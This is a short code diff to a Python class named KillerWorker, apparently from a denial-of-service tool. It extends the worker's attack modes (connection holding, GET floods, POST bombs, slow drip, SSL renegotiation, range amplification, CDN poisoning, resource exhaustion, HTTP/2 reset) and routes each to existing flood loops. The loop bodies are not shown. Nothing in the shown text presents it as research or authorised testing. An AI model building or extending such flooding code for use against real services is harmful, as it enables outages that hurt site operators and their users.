@@ -818,7 +818,7 @@ class KillerWorker:
     async def run(self) -> EngineMetrics:
         """
         Run attack vectors based on vector_mode.
-        Modes: all (default), connhold, flood, post, slow
+        Modes: all, connhold, flood, post, slow, drip, sslreneg, rangeamp, cdnpoison, resexh, h2reset
         """
         self.metrics.started_at = time.time()
         
@@ -826,13 +826,18 @@ class KillerWorker:
         tasks = []
         if mode in ("all", "connhold"):
             tasks.append(asyncio.create_task(self._conn_hold_loop()))
-        if mode in ("all", "flood"):
+        if mode in ("all", "flood", "slow", "drip"):
             tasks.append(asyncio.create_task(self._get_flood_loop()))
         if mode in ("all", "post", "cdnpoison", "resexh"):
             tasks.append(asyncio.create_task(self._post_bomb_loop()))
         if mode in ("all", "h2reset"):
-            # H2 reset uses get_flood_loop with higher frequency
             tasks.append(asyncio.create_task(self._get_flood_loop()))
+        if mode in ("sslreneg",):
+            # ssl reneg uses conn_hold with chunked hold trick
+            tasks.append(asyncio.create_task(self._conn_hold_loop()))
+        if mode in ("rangeamp",):
+            # range amp uses post_bomb with larger payloads
+            tasks.append(asyncio.create_task(self._post_bomb_loop()))
         
         gather_task = asyncio.gather(*tasks, return_exceptions=True)
         timeout = max(30, self.duration_seconds + 10)
